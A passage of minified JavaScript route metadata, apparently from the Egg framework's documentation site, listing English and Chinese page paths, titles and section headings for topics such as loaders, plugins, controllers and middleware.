Egg"},{path:"/zh-CN/advanced",component:n("lhGU").default,exact:!0,meta:{filePath:"site/docs/advanced/index.zh-CN.md",updatedTime:1687656833e3,title:"\u8fdb\u9636",order:0,nav:{title:"\u8fdb\u9636",order:5,path:"/zh-CN/advanced"},slugs:[],locale:"zh-CN"},title:"\u8fdb\u9636 - Egg"},{path:"/advanced/loader-update",component:n("/Xeo").default,exact:!0,meta:{filePath:"site/docs/advanced/loader-update.md",updatedTime:1687656833e3,title:"Upgrade your event functions in your lifecycle",order:6,slugs:[{depth:2,value:"Replacer for beforeStart",heading:"replacer-for-beforestart"},{depth:2,value:"Replacer for ready",heading:"replacer-for-ready"},{depth:2,value:"Replacer for beforeClose",heading:"replacer-for-beforeclose"},{depth:2,value:"Others",heading:"others"}],nav:{path:"/advanced",title:"Advanced"}},title:"Upgrade your event functions in your lifecycle - Egg"},{path:"/zh-CN/advanced/loader-update",component:n("yuVb").default,exact:!0,meta:{filePath:"site/docs/advanced/loader-update.zh-CN.md",updatedTime:1687656833e3,title:"\u5347\u7ea7\u4f60\u7684\u751f\u547d\u5468\u671f\u4e8b\u4ef6\u51fd\u6570",order:6,slugs:[{depth:2,value:"beforeStart \u51fd\u6570\u66ff\u4ee3",heading:"beforestart-\u51fd\u6570\u66ff\u4ee3"},{depth:2,value:"ready \u51fd\u6570\u66ff\u4ee3",heading:"ready-\u51fd\u6570\u66ff\u4ee3"},{depth:2,value:"beforeClose \u51fd\u6570\u66ff\u4ee3",heading:"beforeclose-\u51fd\u6570\u66ff\u4ee3"},{depth:2,value:"\u5176\u5b83\u8bf4\u660e",heading:"\u5176\u5b83\u8bf4\u660e"}],locale:"zh-CN",nav:{path:"/zh-CN/advanced",title:"\u8fdb\u9636"}},title:"\u5347\u7ea7\u4f60\u7684\u751f\u547d\u5468\u671f\u4e8b\u4ef6\u51fd\u6570 - Egg"},{path:"/advanced/loader",component:n("a9nJ").default,exact:!0,meta:{filePath:"site/docs/advanced/loader.md",updatedTime:1687656833e3,title:"Loader",order:1,slugs:[{depth:2,value:"Application, Framework and Plugin",heading:"application-framework-and-plugin"},{depth:2,value:"LoadUnit",heading:"loadunit"},{depth:3,value:"File Order",heading:"file-order"},{depth:3,value:"Life Cycles",heading:"life-cycles"},{depth:2,value:"beforeStart",heading:"beforestart"},{depth:2,value:"ready",heading:"ready"},{depth:2,value:"beforeClose",heading:"beforeclose"},{depth:3,value:"File-Loading Rules",heading:"file-loading-rules"},{depth:2,value:"Extend Loader",heading:"extend-loader"},{depth:2,value:"Loader API",heading:"loader-api"},{depth:3,value:"loadFile",heading:"loadfile"},{depth:3,value:"loadToApp",heading:"loadtoapp"},{depth:3,value:"loadToContext",heading:"loadtocontext"},{depth:3,value:"LoaderOptions",heading:"loaderoptions"},{depth:4,value:"ignore [String]",heading:"ignore-string"},{depth:4,value:"initializer [Function]",heading:"initializer-function"},{depth:4,value:"caseStyle [String]",heading:"casestyle-string"},{depth:4,value:"override [Boolean]",heading:"override-boolean"},{depth:4,value:"call [Boolean]",heading:"call-boolean"},{depth:2,value:"CustomLoader",heading:"customloader"}],nav:{path:"/advanced",title:"Advanced"}},title:"Loader - Egg"},{path:"/zh-CN/advanced/loader",component:n("YpfI").default,exact:!0,meta:{filePath:"site/docs/advanced/loader.zh-CN.md",updatedTime:1687656833e3,title:"\u52a0\u8f7d\u5668\uff08Loader\uff09",order:1,slugs:[{depth:2,value:"\u5e94\u7528\u3001\u6846\u67b6\u548c\u63d2\u4ef6",heading:"\u5e94\u7528\u6846\u67b6\u548c\u63d2\u4ef6"},{depth:2,value:"\u52a0\u8f7d\u5355\u5143\uff08loadUnit\uff09",heading:"\u52a0\u8f7d\u5355\u5143loadunit"},{depth:3,value:"\u6587\u4ef6\u987a\u5e8f",heading:"\u6587\u4ef6\u987a\u5e8f"},{depth:3,value:"\u751f\u547d\u5468\u671f",heading:"\u751f\u547d\u5468\u671f"},{depth:2,value:"beforeStart",heading:"beforestart"},{depth:2,value:"ready",heading:"ready"},{depth:2,value:"beforeClose",heading:"beforeclose"},{depth:3,value:"\u6587\u4ef6\u52a0\u8f7d\u89c4\u5219",heading:"\u6587\u4ef6\u52a0\u8f7d\u89c4\u5219"},{depth:2,value:"\u6269\u5c55 Loader",heading:"\u6269\u5c55-loader"},{depth:2,value:"\u52a0\u8f7d\u5668\u51fd\u6570\uff08Loader API\uff09",heading:"\u52a0\u8f7d\u5668\u51fd\u6570loader-api"},{depth:3,value:"loadFile",heading:"loadfile"},{depth:3,value:"loadToApp",heading:"loadtoapp"},{depth:3,value:"loadToContext",heading:"loadtocontext"},{depth:3,value:"LoaderOptions",heading:"loaderoptions"},{depth:4,value:"ignore [String]",heading:"ignore-string"},{depth:4,value:"initializer [Function]",heading:"initializer-function"},{depth:4,value:"caseStyle [String]",heading:"casestyle-string"},{depth:4,value:"override [Boolean]",heading:"override-boolean"},{depth:4,value:"call [Boolean]",heading:"call-boolean"},{depth:2,value:"CustomLoader",heading:"customloader"}],locale:"zh-CN",nav:{path:"/zh-CN/advanced",title:"\u8fdb\u9636"}},title:"\u52a0\u8f7d\u5668\uff08Loader\uff09 - Egg"},{path:"/advanced/plugin",component:n("v5kC").default,exact:!0,meta:{filePath:"site/docs/advanced/plugin.md",updatedTime:1687656833e3,title:"Plugin Development",order:2,slugs:[{depth:2,value:"Plugin Development",heading:"plugin-development"},{depth:3,value:"Quick Start with Scaffold",heading:"quick-start-with-scaffold"},{depth:2,value:"Directory of Plugin",heading:"directory-of-plugin"},{depth:2,value:"Dependencies Management of Plugins",heading:"dependencies-management-of-plugins"},{depth:2,value:"What can Plugin Do?",heading:"what-can-plugin-do"},{depth:3,value:"Built-in Objects API Extensions",heading:"built-in-objects-api-extensions"},{depth:3,value:"Insert Custom Middlewares",heading:"insert-custom-middlewares"},{depth:3,value:"Initialization on Application Starting",heading:"initialization-on-application-starting"},{depth:3,value:"Setup Schedule Task",heading:"setup-schedule-task"},{depth:3,value:"Best Practice of Global Instance Plugins",heading:"best-practice-of-global-instance-plugins"},{depth:4,value:"Ways of writing plugins",heading:"ways-of-writing-plugins"},{depth:4,value:"Application Layer Usage Case",heading:"application-layer-usage-case"},{depth:5,value:"Single Instance",heading:"single-instance"},{depth:5,value:"Multiple Instances",heading:"multiple-instances"},{depth:5,value:"Dynamically Instantiating",heading:"dynamically-instantiating"},{depth:3,value:"Plugin Locate Rule",heading:"plugin-locate-rule"},{depth:3,value:"Plugin Specification",heading:"plugin-specification"},{depth:2,value:"Why Do Not Use the npm Package Name as the Plugin Name?",heading:"why-do-not-use-the-npm-package-name-as-the-plugin-name"}],nav:{path:"/advanced",title:"Advanced"}},title:"Plugin Development - Egg"},{path:"/zh-CN/advanced/plugin",component:n("9xi1").default,exact:!0,meta:{filePath:"site/docs/advanced/plugin.zh-CN.md",updatedTime:1687656833e3,title:"\u63d2\u4ef6\u5f00\u53d1",order:2,slugs:[{depth:2,value:"\u63d2\u4ef6\u5f00\u53d1",heading:"\u63d2\u4ef6\u5f00\u53d1"},{depth:3,value:"\u4f7f\u7528\u811a\u624b\u67b6\u5feb\u901f\u5f00\u53d1",heading:"\u4f7f\u7528\u811a\u624b\u67b6\u5feb\u901f\u5f00\u53d1"},{depth:2,value:"\u63d2\u4ef6\u7684\u76ee\u5f55\u7ed3\u6784",heading:"\u63d2\u4ef6\u7684\u76ee\u5f55\u7ed3\u6784"},{depth:2,value:"\u63d2\u4ef6\u7684\u4f9d\u8d56\u7ba1\u7406",heading:"\u63d2\u4ef6\u7684\u4f9d\u8d56\u7ba1\u7406"},{depth:2,value:"\u63d2\u4ef6\u80fd\u505a\u4ec0\u4e48\uff1f",heading:"\u63d2\u4ef6\u80fd\u505a\u4ec0\u4e48"},{depth:3,value:"\u6269\u5c55\u5185\u7f6e\u5bf9\u8c61\u7684\u63a5\u53e3",heading:"\u6269\u5c55\u5185\u7f6e\u5bf9\u8c61\u7684\u63a5\u53e3"},{depth:3,value:"\u63d2\u5165\u81ea\u5b9a\u4e49\u4e2d\u95f4\u4ef6",heading:"\u63d2\u5165\u81ea\u5b9a\u4e49\u4e2d\u95f4\u4ef6"},{depth:3,value:"\u5728\u5e94\u7528\u542f\u52a8\u65f6\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c",heading:"\u5728\u5e94\u7528\u542f\u52a8\u65f6\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c"},{depth:3,value:"\u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1",heading:"\u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1"},{depth:3,value:"\u5168\u5c40\u5b9e\u4f8b\u63d2\u4ef6\u7684\u6700\u4f73\u5b9e\u8df5",heading:"\u5168\u5c40\u5b9e\u4f8b\u63d2\u4ef6\u7684\u6700\u4f73\u5b9e\u8df5"},{depth:4,value:"\u63d2\u4ef6\u5199\u6cd5",heading:"\u63d2\u4ef6\u5199\u6cd5"},{depth:4,value:"\u5e94\u7528\u5c42\u4f7f\u7528\u65b9\u6848",heading:"\u5e94\u7528\u5c42\u4f7f\u7528\u65b9\u6848"},{depth:5,value:"\u5355\u5b9e\u4f8b",heading:"\u5355\u5b9e\u4f8b"},{depth:5,value:"\u591a\u5b9e\u4f8b",heading:"\u591a\u5b9e\u4f8b"},{depth:5,value:"\u52a8\u6001\u521b\u5efa\u5b9e\u4f8b",heading:"\u52a8\u6001\u521b\u5efa\u5b9e\u4f8b"},{depth:3,value:"\u63d2\u4ef6\u7684\u5bfb\u5740\u89c4\u5219",heading:"\u63d2\u4ef6\u7684\u5bfb\u5740\u89c4\u5219"},{depth:3,value:"\u63d2\u4ef6\u89c4\u8303",heading:"\u63d2\u4ef6\u89c4\u8303"},{depth:2,value:"\u4e3a\u4f55\u4e0d\u4f7f\u7528 npm \u5305\u540d\u6765\u505a\u63d2\u4ef6\u540d\uff1f",heading:"\u4e3a\u4f55\u4e0d\u4f7f\u7528-npm-\u5305\u540d\u6765\u505a\u63d2\u4ef6\u540d"}],locale:"zh-CN",nav:{path:"/zh-CN/advanced",title:"\u8fdb\u9636"}},title:"\u63d2\u4ef6\u5f00\u53d1 - Egg"},{path:"/advanced/view-plugin",component:n("zAgc").default,exact:!0,meta:{filePath:"site/docs/advanced/view-plugin.md",updatedTime:1687656833e3,title:"View Plugin Development",order:5,slugs:[{depth:2,value:"Plugin Directory Structure",heading:"plugin-directory-structure"},{depth:2,value:"Plugin Naming Convention",heading:"plugin-naming-convention"},{depth:2,value:"View Base Class",heading:"view-base-class"},{depth:3,value:"Parameters",heading:"parameters"},{depth:2,value:"Plugin Configuration",heading:"plugin-configuration"},{depth:3,value:"Helper",heading:"helper"},{depth:3,value:"Security Related",heading:"security-related"},{depth:3,value:"Unit Tests",heading:"unit-tests"}],nav:{path:"/advanced",title:"Advanced"}},title:"View Plugin Development - Egg"},{path:"/zh-CN/advanced/view-plugin",component:n("rix1").default,exact:!0,meta:{filePath:"site/docs/advanced/view-plugin.zh-CN.md",updatedTime:1687656833e3,title:"View \u63d2\u4ef6\u5f00\u53d1",order:5,slugs:[{depth:2,value:"\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784",heading:"\u63d2\u4ef6\u76ee\u5f55\u7ed3\u6784"},{depth:2,value:"\u63d2\u4ef6\u547d\u540d\u89c4\u8303",heading:"\u63d2\u4ef6\u547d\u540d\u89c4\u8303"},{depth:2,value:"View \u57fa\u7c7b",heading:"view-\u57fa\u7c7b"},{depth:3,value:"\u53c2\u6570",heading:"\u53c2\u6570"},{depth:2,value:"\u63d2\u4ef6\u914d\u7f6e",heading:"\u63d2\u4ef6\u914d\u7f6e"},{depth:3,value:"helper",heading:"helper"},{depth:3,value:"\u5b89\u5168\u76f8\u5173",heading:"\u5b89\u5168\u76f8\u5173"},{depth:3,value:"\u5355\u5143\u6d4b\u8bd5",heading:"\u5355\u5143\u6d4b\u8bd5"}],locale:"zh-CN",nav:{path:"/zh-CN/advanced",title:"\u8fdb\u9636"}},title:"View \u63d2\u4ef6\u5f00\u53d1 - Egg"},{path:"/basics/app-start",component:n("/qa7").default,exact:!0,meta:{filePath:"site/docs/basics/app-start.md",updatedTime:1687656833e3,title:"Application Startup Configuration",order:12,slugs:[],nav:{path:"/basics",title:"Basic"}},title:"Application Startup Configuration - Egg"},{path:"/zh-CN/basics/app-start",component:n("gRRP").default,exact:!0,meta:{filePath:"site/docs/basics/app-start.zh-CN.md",updatedTime:1687656833e3,title:"\u542f\u52a8\u81ea\u5b9a\u4e49",order:12,slugs:[],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u542f\u52a8\u81ea\u5b9a\u4e49 - Egg"},{path:"/basics/config",component:n("Tgko").default,exact:!0,meta:{filePath:"site/docs/basics/config.md",updatedTime:1687656833e3,title:"Configuration",order:4,slugs:[{depth:3,value:"Multiple Environment Configuration",heading:"multiple-environment-configuration"},{depth:3,value:"How to Write Configuration",heading:"how-to-write-configuration"},{depth:3,value:"Sequence of Loading Configurations",heading:"sequence-of-loading-configurations"},{depth:3,value:"Rules of Merging",heading:"rules-of-merging"},{depth:3,value:"Configuration Result",heading:"configuration-result"}],nav:{path:"/basics",title:"Basic"}},title:"Configuration - Egg"},{path:"/zh-CN/basics/config",component:n("rfUw").default,exact:!0,meta:{filePath:"site/docs/basics/config.zh-CN.md",updatedTime:1687656833e3,title:"Config \u914d\u7f6e",order:4,slugs:[{depth:3,value:"\u591a\u73af\u5883\u914d\u7f6e",heading:"\u591a\u73af\u5883\u914d\u7f6e"},{depth:3,value:"\u914d\u7f6e\u5199\u6cd5",heading:"\u914d\u7f6e\u5199\u6cd5"},{depth:3,value:"\u914d\u7f6e\u52a0\u8f7d\u987a\u5e8f",heading:"\u914d\u7f6e\u52a0\u8f7d\u987a\u5e8f"},{depth:3,value:"\u5408\u5e76\u89c4\u5219",heading:"\u5408\u5e76\u89c4\u5219"},{depth:3,value:"\u914d\u7f6e\u7ed3\u679c",heading:"\u914d\u7f6e\u7ed3\u679c"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"Config \u914d\u7f6e - Egg"},{path:"/basics/controller",component:n("j14B").default,exact:!0,meta:{filePath:"site/docs/basics/controller.md",updatedTime:1687656833e3,title:"Controller",order:7,slugs:[{depth:2,value:"What is Controller",heading:"what-is-controller"},{depth:2,value:"How To Write Controller",heading:"how-to-write-controller"},{depth:3,value:"Controller Class(Recommended)",heading:"controller-classrecommended"},{depth:4,value:"Customized Controller Base Class",heading:"customized-controller-base-class"},{depth:3,value:"Methods Style Controller (It's not recommended, only for compatibility)",heading:"methods-style-controller-its-not-recommended-only-for-compatibility"},{depth:2,value:"HTTP Basics",heading:"http-basics"},{depth:2,value:"Acquire HTTP Request Parameters",heading:"acquire-http-request-parameters"},{depth:3,value:"query",heading:"query"},{depth:4,value:"queries",heading:"queries"},{depth:3,value:"Router Params",heading:"router-params"},{depth:3,value:"body",heading:"body"},{depth:3,value:"Acquiring the Submitted Files",heading:"acquiring-the-submitted-files"},{depth:4,value:"File Mode:",heading:"file-mode"},{depth:4,value:"Stream Mode",heading:"stream-mode"},{depth:3,value:"header",heading:"header"},{depth:4,value:"ctx.host",heading:"ctxhost"},{depth:4,value:"ctx.protocol",heading:"ctxprotocol"},{depth:4,value:"ctx.ips",heading:"ctxips"},{depth:4,value:"ctx.ip",heading:"ctxip"},{depth:3,value:"Cookie",heading:"cookie"},{depth:4,value:"Configuration",heading:"configuration"},{depth:3,value:"Session",heading:"session"},{depth:4,value:"Configuration",heading:"configuration-1"},{depth:2,value:"Parameter Validation",heading:"parameter-validation"},{depth:3,value:"Validation Rules",heading:"validation-rules"},{depth:4,value:"Customizing Validation Rules",heading:"customizing-validation-rules"},{depth:2,value:"Using Service",heading:"using-service"},{depth:2,value:"Sending HTTP Response",heading:"sending-http-response"},{depth:3,value:"Setting Status",heading:"setting-status"},{depth:3,value:"Body Setting",heading:"body-setting"},{depth:4,value:"Rendering Template",heading:"rendering-template"},{depth:4,value:"JSONP",heading:"jsonp"},{depth:5,value:"JSONP Configuration",heading:"jsonp-configuration"},{depth:4,value:"XSS Defense Configuration",heading:"xss-defense-configuration"},{depth:5,value:"CSRF",heading:"csrf"},{depth:5,value:"Validation Reference",heading:"validation-reference"},{depth:3,value:"Header Setting",heading:"header-setting"},{depth:3,value:"Redirect",heading:"redirect"}],nav:{path:"/basics",title:"Basic"}},title:"Controller - Egg"},{path:"/zh-CN/basics/controller",component:n("5pkK").default,exact:!0,meta:{filePath:"site/docs/basics/controller.zh-CN.md",updatedTime:1687656833e3,title:"\u63a7\u5236\u5668\uff08Controller\uff09",order:7,slugs:[{depth:2,value:"\u4ec0\u4e48\u662f Controller",heading:"\u4ec0\u4e48\u662f-controller"},{depth:2,value:"\u5982\u4f55\u7f16\u5199 Controller",heading:"\u5982\u4f55\u7f16\u5199-controller"},{depth:3,value:"Controller \u7c7b\uff08\u63a8\u8350\uff09",heading:"controller-\u7c7b\u63a8\u8350"},{depth:4,value:"\u81ea\u5b9a\u4e49 Controller \u57fa\u7c7b",heading:"\u81ea\u5b9a\u4e49-controller-\u57fa\u7c7b"},{depth:3,value:"Controller \u65b9\u6cd5\uff08\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u53ea\u662f\u4e3a\u4e86\u517c\u5bb9\uff09",heading:"controller-\u65b9\u6cd5\u4e0d\u63a8\u8350\u4f7f\u7528\u53ea\u662f\u4e3a\u4e86\u517c\u5bb9"},{depth:2,value:"HTTP \u57fa\u7840",heading:"http-\u57fa\u7840"},{depth:2,value:"\u83b7\u53d6 HTTP \u8bf7\u6c42\u53c2\u6570",heading:"\u83b7\u53d6-http-\u8bf7\u6c42\u53c2\u6570"},{depth:3,value:"query",heading:"query"},{depth:4,value:"queries",heading:"queries"},{depth:3,value:"Router params",heading:"router-params"},{depth:3,value:"body",heading:"body"},{depth:3,value:"\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6",heading:"\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6"},{depth:4,value:"File \u6a21\u5f0f\uff1a",heading:"file-\u6a21\u5f0f"},{depth:4,value:"Stream \u6a21\u5f0f\uff1a",heading:"stream-\u6a21\u5f0f"},{depth:3,value:"header",heading:"header"},{depth:4,value:"ctx.host",heading:"ctxhost"},{depth:4,value:"ctx.protocol",heading:"ctxprotocol"},{depth:4,value:"ctx.ips",heading:"ctxips"},{depth:4,value:"ctx.ip",heading:"ctxip"},{depth:3,value:"Cookie",heading:"cookie"},{depth:4,value:"\u914d\u7f6e",heading:"\u914d\u7f6e"},{depth:3,value:"Session",heading:"session"},{depth:4,value:"\u914d\u7f6e",heading:"\u914d\u7f6e-1"},{depth:2,value:"\u53c2\u6570\u6821\u9a8c",heading:"\u53c2\u6570\u6821\u9a8c"},{depth:3,value:"\u6821\u9a8c\u89c4\u5219",heading:"\u6821\u9a8c\u89c4\u5219"},{depth:4,value:"\u81ea\u5b9a\u4e49\u6821\u9a8c\u89c4\u5219",heading:"\u81ea\u5b9a\u4e49\u6821\u9a8c\u89c4\u5219"},{depth:2,value:"\u8c03\u7528 Service",heading:"\u8c03\u7528-service"},{depth:2,value:"\u53d1\u9001 HTTP \u54cd\u5e94",heading:"\u53d1\u9001-http-\u54cd\u5e94"},{depth:3,value:"\u8bbe\u7f6e status",heading:"\u8bbe\u7f6e-status"},{depth:3,value:"\u8bbe\u7f6e body",heading:"\u8bbe\u7f6e-body"},{depth:4,value:"\u6e32\u67d3\u6a21\u677f",heading:"\u6e32\u67d3\u6a21\u677f"},{depth:4,value:"JSONP",heading:"jsonp"},{depth:5,value:"JSONP \u914d\u7f6e",heading:"jsonp-\u914d\u7f6e"},{depth:5,value:"\u8de8\u7ad9\u9632\u5fa1\u914d\u7f6e",heading:"\u8de8\u7ad9\u9632\u5fa1\u914d\u7f6e"},{depth:6,value:"CSRF",heading:"csrf"},{depth:5,value:"referrer \u6821\u9a8c",heading:"referrer-\u6821\u9a8c"},{depth:3,value:"\u8bbe\u7f6e Header",heading:"\u8bbe\u7f6e-header"},{depth:3,value:"\u91cd\u5b9a\u5411",heading:"\u91cd\u5b9a\u5411"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u63a7\u5236\u5668\uff08Controller\uff09 - Egg"},{path:"/basics/env",component:n("ZJCz").default,exact:!0,meta:{filePath:"site/docs/basics/env.md",updatedTime:1687656833e3,title:"Runtime Environment",order:3,slugs:[{depth:2,value:"Configure Runtime Environment",heading:"configure-runtime-environment"},{depth:2,value:"Access to the Runtime Environment in Application",heading:"access-to-the-runtime-environment-in-application"},{depth:2,value:"Configurations of Runtime Environment",heading:"configurations-of-runtime-environment"},{depth:2,value:"Difference from NODE_ENV",heading:"difference-from-node_env"},{depth:2,value:"Environment Customization",heading:"environment-customization"},{depth:2,value:"Difference from Koa",heading:"difference-from-koa"}],nav:{path:"/basics",title:"Basic"}},title:"Runtime Environment - Egg"},{path:"/zh-CN/basics/env",component:n("LY5W").default,exact:!0,meta:{filePath:"site/docs/basics/env.zh-CN.md",updatedTime:1687656833e3,title:"\u8fd0\u884c\u73af\u5883",order:3,slugs:[{depth:2,value:"\u6307\u5b9a\u8fd0\u884c\u73af\u5883",heading:"\u6307\u5b9a\u8fd0\u884c\u73af\u5883"},{depth:2,value:"\u5e94\u7528\u5185\u83b7\u53d6\u8fd0\u884c\u73af\u5883",heading:"\u5e94\u7528\u5185\u83b7\u53d6\u8fd0\u884c\u73af\u5883"},{depth:2,value:"\u8fd0\u884c\u73af\u5883\u76f8\u5173\u914d\u7f6e",heading:"\u8fd0\u884c\u73af\u5883\u76f8\u5173\u914d\u7f6e"},{depth:2,value:"\u4e0e NODE_ENV \u7684\u533a\u522b",heading:"\u4e0e-node_env-\u7684\u533a\u522b"},{depth:2,value:"\u81ea\u5b9a\u4e49\u73af\u5883",heading:"\u81ea\u5b9a\u4e49\u73af\u5883"},{depth:2,value:"\u4e0e Koa \u7684\u533a\u522b",heading:"\u4e0e-koa-\u7684\u533a\u522b"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u8fd0\u884c\u73af\u5883 - Egg"},{path:"/basics/extend",component:n("BC1W").default,exact:!0,meta:{filePath:"site/docs/basics/extend.md",updatedTime:1687656833e3,title:"Extend EGG",order:11,slugs:[{depth:2,value:"Application",heading:"application"},{depth:3,value:"Access Method",heading:"access-method"},{depth:3,value:"How to Extend",heading:"how-to-extend"},{depth:4,value:"Extend Methods",heading:"extend-methods"},{depth:4,value:"Extend Properties",heading:"extend-properties"},{depth:2,value:"Context",heading:"context"},{depth:3,value:"Access Method",heading:"access-method-1"},{depth:3,value:"How to extend",heading:"how-to-extend-1"},{depth:4,value:"Extend Methods",heading:"extend-methods-1"},{depth:4,value:"Extend Properties",heading:"extend-properties-1"},{depth:2,value:"Request",heading:"request"},{depth:3,value:"Access Method",heading:"access-method-2"},{depth:3,value:"How to Extend",heading:"how-to-extend-2"},{depth:2,value:"Response",heading:"response"},{depth:3,value:"Access Method",heading:"access-method-3"},{depth:3,value:"How to Extend",heading:"how-to-extend-3"},{depth:2,value:"Helper",heading:"helper"},{depth:3,value:"Access Method",heading:"access-method-4"},{depth:3,value:"How to Extend",heading:"how-to-extend-4"},{depth:2,value:"Extend according to environment",heading:"extend-according-to-environment"}],nav:{path:"/basics",title:"Basic"}},title:"Extend EGG - Egg"},{path:"/zh-CN/basics/extend",component:n("J84a").default,exact:!0,meta:{filePath:"site/docs/basics/extend.zh-CN.md",updatedTime:1687656833e3,title:"\u6846\u67b6\u6269\u5c55",order:11,slugs:[{depth:2,value:"Application",heading:"application"},{depth:3,value:"\u8bbf\u95ee\u65b9\u5f0f",heading:"\u8bbf\u95ee\u65b9\u5f0f"},{depth:3,value:"\u6269\u5c55\u65b9\u5f0f",heading:"\u6269\u5c55\u65b9\u5f0f"},{depth:4,value:"\u65b9\u6cd5\u6269\u5c55",heading:"\u65b9\u6cd5\u6269\u5c55"},{depth:4,value:"\u5c5e\u6027\u6269\u5c55",heading:"\u5c5e\u6027\u6269\u5c55"},{depth:2,value:"Context",heading:"context"},{depth:3,value:"\u8bbf\u95ee\u65b9\u5f0f",heading:"\u8bbf\u95ee\u65b9\u5f0f-1"},{depth:3,value:"\u6269\u5c55\u65b9\u5f0f",heading:"\u6269\u5c55\u65b9\u5f0f-1"},{depth:4,value:"\u65b9\u6cd5\u6269\u5c55",heading:"\u65b9\u6cd5\u6269\u5c55-1"},{depth:4,value:"\u5c5e\u6027\u6269\u5c55",heading:"\u5c5e\u6027\u6269\u5c55-1"},{depth:2,value:"Request",heading:"request"},{depth:3,value:"\u8bbf\u95ee\u65b9\u5f0f",heading:"\u8bbf\u95ee\u65b9\u5f0f-2"},{depth:3,value:"\u6269\u5c55\u65b9\u5f0f",heading:"\u6269\u5c55\u65b9\u5f0f-2"},{depth:2,value:"Response",heading:"response"},{depth:3,value:"\u8bbf\u95ee\u65b9\u5f0f",heading:"\u8bbf\u95ee\u65b9\u5f0f-3"},{depth:3,value:"\u6269\u5c55\u65b9\u5f0f",heading:"\u6269\u5c55\u65b9\u5f0f-3"},{depth:2,value:"Helper",heading:"helper"},{depth:3,value:"\u8bbf\u95ee\u65b9\u5f0f",heading:"\u8bbf\u95ee\u65b9\u5f0f-4"},{depth:3,value:"\u6269\u5c55\u65b9\u5f0f",heading:"\u6269\u5c55\u65b9\u5f0f-4"},{depth:2,value:"\u6309\u7167\u73af\u5883\u8fdb\u884c\u6269\u5c55",heading:"\u6309\u7167\u73af\u5883\u8fdb\u884c\u6269\u5c55"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u6846\u67b6\u6269\u5c55 - Egg"},{path:"/basics",component:n("mTot").default,exact:!0,meta:{filePath:"site/docs/basics/index.md",updatedTime:1687656833e3,title:"Basic",order:0,nav:{title:"Basic",order:4,path:"/basics"},slugs:[]},title:"Basic - Egg"},{path:"/zh-CN/basics",component:n("ljBM").default,exact:!0,meta:{filePath:"site/docs/basics/index.zh-CN.md",updatedTime:1687656833e3,title:"\u57fa\u7840\u529f\u80fd",order:0,nav:{title:"\u57fa\u7840\u529f\u80fd",order:4,path:"/zh-CN/basics"},slugs:[],locale:"zh-CN"},title:"\u57fa\u7840\u529f\u80fd - Egg"},{path:"/basics/middleware",component:n("QDLP").default,exact:!0,meta:{filePath:"site/docs/basics/middleware.md",updatedTime:1687656833e3,title:"Middleware",order:5,slugs:[{depth:2,value:"Writing Middleware",heading:"writing-middleware"},{depth:3,value:"How to Write",heading:"how-to-write"},{depth:3,value:"Configuration",heading:"configuration"},{depth:2,value:"Using Middleware",heading:"using-middleware"},{depth:3,value:"Using Middleware in Application",heading:"using-middleware-in-application"},{depth:2,value:"Using Middleware in Framework and Plugin",heading:"using-middleware-in-framework-and-plugin"},{depth:2,value:"Using Middleware in Router",heading:"using-middleware-in-router"},{depth:2,value:"Default Framework Middleware",heading:"default-framework-middleware"},{depth:2,value:"Use Koa's Middleware",heading:"use-koas-middleware"},{depth:2,value:"General Configuration",heading:"general-configuration"},{depth:3,value:"enable",heading:"enable"},{depth:3,value:"match and ignore",heading:"match-and-ignore"}],nav:{path:"/basics",title:"Basic"}},title:"Middleware - Egg"},{path:"/zh-CN/basics/middleware",component:n("/5sn").default,exact:!0,meta:{filePath:"site/docs/basics/middleware.zh-CN.md",updatedTime:1687656833e3,title:"\u4e2d\u95f4\u4ef6\uff08Middleware\uff09",order:5,slugs:[{depth:2,value:"\u7f16\u5199\u4e2d\u95f4\u4ef6",heading:"\u7f16\u5199\u4e2d\u95f4\u4ef6"},{depth:3,value:"\u5199\u6cd5",heading:"\u5199\u6cd5"},{depth:3,value:"\u914d\u7f6e",heading:"\u914d\u7f6e"},{depth:2,value:"\u4f7f\u7528\u4e2d\u95f4\u4ef6",heading:"\u4f7f\u7528\u4e2d\u95f4\u4ef6"},{depth:3,value:"\u5728\u5e94\u7528\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6",heading:"\u5728\u5e94\u7528\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"},{depth:3,value:"\u5728\u6846\u67b6\u548c\u63d2\u4ef6\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6",heading:"\u5728\u6846\u67b6\u548c\u63d2\u4ef6\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"},{depth:3,value:"router \u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6",heading:"router-\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"},{depth:2,value:"\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6",heading:"\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6"},{depth:2,value:"\u4f7f\u7528 Koa \u7684\u4e2d\u95f4\u4ef6",heading:"\u4f7f\u7528-koa-\u7684\u4e2d\u95f4\u4ef6"},{depth:2,value:"\u901a\u7528\u914d\u7f6e",heading:"\u901a\u7528\u914d\u7f6e"},{depth:3,value:"enable",heading:"enable"},{depth:3,value:"match \u548c ignore",heading:"match-\u548c-ignore"}],locale:"zh-CN",nav:{path:"/zh-CN/basics",title:"\u57fa\u7840\u529f\u80fd"}},title:"\u4e2d\u95f4\u4ef6\uff08Middleware\uff09 - Egg"},{path:"/basics/objects",component:n("ZBQy").default,exact:!0,meta:{filePath:"site/docs/basics/objects.md",updatedTime:1687656833e3,title:"Framework Built-in 